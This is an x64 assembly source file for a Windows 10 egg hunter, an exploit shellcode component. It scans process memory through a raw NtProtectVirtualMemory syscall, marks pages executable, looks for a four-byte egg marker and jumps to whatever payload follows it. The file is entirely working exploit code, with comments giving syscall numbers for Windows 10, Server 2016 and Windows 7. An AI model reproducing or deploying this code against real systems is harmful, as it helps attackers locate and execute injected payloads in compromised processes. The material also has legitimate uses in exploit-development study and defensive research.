PUBLIC Win10egghunterx64

.code

Win10egghunterx64 PROC

_start:
    push 7fh
    pop rdi                               ; RDI is nonvolatile, so it will be preserved after syscalls

_setup:
    inc rdi                                ; parameter 1 - lpAddress - counter
    mov r9b,40h                      ; parameter 3 - flNewProtect - 0x40 PAGE_EXECUTE_READWRITE
    pop rsi                                ; Stack alignment before the stack setup
    pop rsi
    push rdi
    push rsp
    pop rdx                                ; pointer to lpAddress
    push 08h                            ; parameter 2 - dwSize 0x8
    push rsp
    pop r8                                ; pointer to dwSize going to r8 - can be exchanged with mov r8,rsp
    mov [rdx+20h],rsp             ; parameter 4 - lpflOldprotect
    dec r10                                ; parameter 5 - hProcess - the handle will be -1, if not set you'll get a c0000008 error
_VirtualProtectEx:

    push 50h                            ; 0x50h for Windows 10 and Windows Server 2016 x64, 0x4Dh for Windows 7 family
    pop rax
    syscall

_rc_check:

    cmp al,01h                            ; check the response for non-allocated memory
    jge _setup

_end:                                    ; There won't be too many of these eggs in the memory

    mov eax, 042303042h                    ; the egg
    scasd
    jnz _setup
    jmp rdi

Win10egghunterx64 ENDP
END